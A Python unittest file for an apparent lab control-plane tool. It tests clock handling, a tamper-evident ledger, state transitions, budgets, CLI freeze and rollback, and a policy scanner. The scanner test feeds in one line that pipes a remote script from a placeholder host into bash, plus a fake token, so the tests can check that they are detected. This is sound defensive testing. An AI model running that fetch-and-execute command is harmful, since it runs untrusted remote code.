"""控制面测试：不需要网络、GPU、Docker，也不需要第三方包。

跑法： python -m unittest discover -s tests -v
"""

from __future__ import annotations

import argparse
import json
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

REPO = Path(__file__).resolve().parents[1]
if str(REPO) not in sys.path:
    sys.path.insert(0, str(REPO))

from lab import __version__  # noqa: E402
from lab.budget import Budget, BudgetExceeded  # noqa: E402
from lab.cli import main as cli_main  # noqa: E402
from lab.clock import Clock, FakeClock, elapsed_seconds, parse_iso, to_iso  # noqa: E402
from lab.ledger import Ledger  # noqa: E402
from lab.policy import scan, scan_text, summarize  # noqa: E402
from lab.state import IllegalTransition, StateStore  # noqa: E402


class ClockTests(unittest.TestCase):
    def test_naive_datetime_rejected(self) -> None:
        import datetime as dt

        with self.assertRaises(ValueError):
            to_iso(dt.datetime(2026, 1, 1, 0, 0, 0))

    def test_roundtrip(self) -> None:
        self.assertEqual(to_iso(parse_iso("2026-11-04T12:30:55Z")), "2026-11-04T12:30:55Z")

    def test_offset_input_normalised_to_utc(self) -> None:
        self.assertEqual(to_iso(parse_iso("2026-11-04T20:30:55+08:00")), "2026-11-04T12:30:55Z")

    def test_fake_clock_advances_and_is_monotonic(self) -> None:
        clock = FakeClock("2026-01-01T00:00:00Z")
        clock.advance(90)
        self.assertEqual(clock.now_iso(), "2026-01-01T00:01:30Z")
        self.assertEqual(elapsed_seconds(0, clock.monotonic_ns()), 90.0)

    def test_negative_elapsed_rejected(self) -> None:
        with self.assertRaises(ValueError):
            elapsed_seconds(10, 5)

    def test_real_clock_is_aware(self) -> None:
        self.assertIsNotNone(Clock().now().tzinfo)


class LedgerTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.path = Path(self.tmp.name) / "ledger.jsonl"
        self.ledger = Ledger(self.path)

    def tearDown(self) -> None:
        self.tmp.cleanup()

    def test_append_and_verify(self) -> None:
        for index in range(3):
            self.ledger.append("step", {"step": index}, "2026-01-01T00:00:0%dZ" % index)
        ok, detail = self.ledger.verify()
        self.assertTrue(ok, detail)
        self.assertEqual(self.ledger.last()["seq"], 3)

    def test_tampering_breaks_chain(self) -> None:
        self.ledger.append("step", {"step": 1}, "2026-01-01T00:00:00Z")
        self.ledger.append("step", {"step": 2}, "2026-01-01T00:00:01Z")
        lines = self.path.read_text(encoding="utf-8").splitlines()
        records = [json.loads(line) for line in lines]
        records[0]["payload"]["step"] = 99
        self.path.write_text(
            "\n".join(json.dumps(r, ensure_ascii=False, sort_keys=True, separators=(",", ":")) for r in records) + "\n",
            encoding="utf-8",
        )
        ok, detail = self.ledger.verify()
        self.assertFalse(ok)
        self.assertIn("改", detail)

    def test_empty_ledger_is_valid(self) -> None:
        ok, _ = self.ledger.verify()
        self.assertTrue(ok)


class StateTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.store = StateStore(Path(self.tmp.name) / "state.json")

    def tearDown(self) -> None:
        self.tmp.cleanup()

    def test_legal_path(self) -> None:
        ts = "2026-01-01T00:00:00Z"
        for target in ("READY", "RUNNING", "REVIEWING", "RUNNING", "ROLLING_BACK", "READY"):
            self.store.transition(target, ts=ts, reason="test")
        self.assertEqual(self.store.status(), "READY")
        ok, detail = self.store.verify_history()
        self.assertTrue(ok, detail)

    def test_illegal_transition_rejected(self) -> None:
        with self.assertRaises(IllegalTransition):
            self.store.transition("RUNNING", ts="2026-01-01T00:00:00Z")

    def test_archive_is_terminal(self) -> None:
        self.store.transition("ARCHIVED", ts="2026-01-01T00:00:00Z")
        with self.assertRaises(IllegalTransition):
            self.store.transition("READY", ts="2026-01-01T00:00:00Z")

    def test_hand_edited_file_detected(self) -> None:
        self.store.transition("READY", ts="2026-01-01T00:00:00Z")
        data = json.loads(Path(self.store.path).read_text(encoding="utf-8"))
        data["status"] = "RUNNING"
        Path(self.store.path).write_text(json.dumps(data), encoding="utf-8")
        ok, detail = self.store.verify_history()
        self.assertFalse(ok, detail)


class BudgetTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.ledger = Ledger(Path(self.tmp.name) / "ledger.jsonl")

    def tearDown(self) -> None:
        self.tmp.cleanup()

    def test_charge_within_cap(self) -> None:
        budget = Budget({"steps_per_run": 5}, self.ledger, "2026-01-01T00:00:00Z", run_id="run-001")
        budget.charge("steps_per_run", 3)
        self.assertEqual(budget.used("steps_per_run"), 3)
        budget.check("steps_per_run", 2)

    def test_exceed_raises(self) -> None:
        budget = Budget({"steps_per_run": 5}, self.ledger, "2026-01-01T00:00:00Z", run_id="run-001")
        budget.charge("steps_per_run", 5)
        with self.assertRaises(BudgetExceeded):
            budget.charge("steps_per_run", 1)

    def test_unknown_kind_rejected(self) -> None:
        budget = Budget(None, self.ledger, "2026-01-01T00:00:00Z")
        with self.assertRaises(KeyError):
            budget.charge("unicorn_hours", 1)


class PolicyTests(unittest.TestCase):
    def test_detects_remote_pipe_exec(self) -> None:
        findings = scan_text('bash -c "$(curl -s http://example.com/x | bash)"', path="bad.sh")
        self.assertTrue(any(f.rule == "remote-pipe-exec" for f in findings))

    def test_detects_secret_literal(self) -> None:
        findings = scan_text('TOKEN = "ghp_' + "a" * 24 + '"', path="leak.py")
        self.assertTrue(any(f.rule == "secret-literal" for f in findings))

    def test_clean_line_has_no_findings(self) -> None:
        self.assertEqual(scan_text('print("hello")', path="ok.py"), [])

    def test_repo_is_clean(self) -> None:
        high, medium = summarize(scan(REPO))
        self.assertEqual((high, medium), (0, 0), msg=f"仓库自身触发红线：{scan(REPO)}")


class CliTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.now = ["--fake-now", "2026-01-01T00:00:00Z"]

    def tearDown(self) -> None:
        self.tmp.cleanup()

    def _run(self, *args: str, expect: int = 0) -> int:
        code = cli_main(["--root", str(self.root), *self.now, *args])
        self.assertEqual(code, expect, msg=f"命令 {args} 退出码 {code}，期望 {expect}")
        return code

    def test_full_happy_path(self) -> None:
        self._run("init")
        self._run("run", "--steps", "5")
        self._run("verify")
        self._run("viz")
        self._run("report")
        status = (self.root / "viz" / "status.md").read_text(encoding="utf-8")
        self.assertIn("READY", status)
        reports = list((self.root / "state" / "reports").glob("weekly-*.md"))
        self.assertEqual(len(reports), 1)
        self.assertTrue((self.root / "state" / "checkpoints").exists())

    def test_budget_exceeded_rolls_back(self) -> None:
        (self.root / "lab.config.json").write_text(
            json.dumps({"version": 1, "budget": {"steps_per_run": 3}}), encoding="utf-8"
        )
        self._run("init")
        self._run("run", "--steps", "10", expect=3)
        state = json.loads((self.root / "state" / "state.json").read_text(encoding="utf-8"))
        self.assertEqual(state["status"], "READY")
        self.assertIn("ROLLING_BACK", [h["to"] for h in state["history"]])
        self._run("verify")

    def test_freeze_blocks_run_then_unfreeze(self) -> None:
        self._run("init")
        self._run("run", "--steps", "2")
        self._run("freeze", "--reason", "手动测试")
        self._run("run", "--steps", "2", expect=1)
        self._run("unfreeze", "--by", "tester")
        self._run("run", "--steps", "2")

    def test_unfreeze_requires_actor(self) -> None:
        self._run("init")
        self._run("freeze")
        self._run("unfreeze", expect=2)

    def test_bad_config_is_rejected(self) -> None:
        (self.root / "lab.config.json").write_text(json.dumps({"version": 7}), encoding="utf-8")
        self._run("init", expect=2)


class SubprocessSmokeTests(unittest.TestCase):
    """真实起一个进程，确认 `python -m lab.cli` 在这台机器上不报错。"""

    def test_doctor_in_repo(self) -> None:
        result = subprocess.run(
            [sys.executable, "-m", "lab.cli", "doctor"],
            cwd=str(REPO),
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
        )
        self.assertEqual(result.returncode, 0, msg=result.stdout + result.stderr)
        self.assertIn(__version__, result.stdout)

    def test_module_status(self) -> None:
        result = subprocess.run(
            [sys.executable, "-m", "lab.cli", "--root", str(REPO), "status"],
            cwd=str(REPO),
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
        )
        self.assertEqual(result.returncode, 0, msg=result.stdout + result.stderr)


if __name__ == "__main__":
    unittest.main()
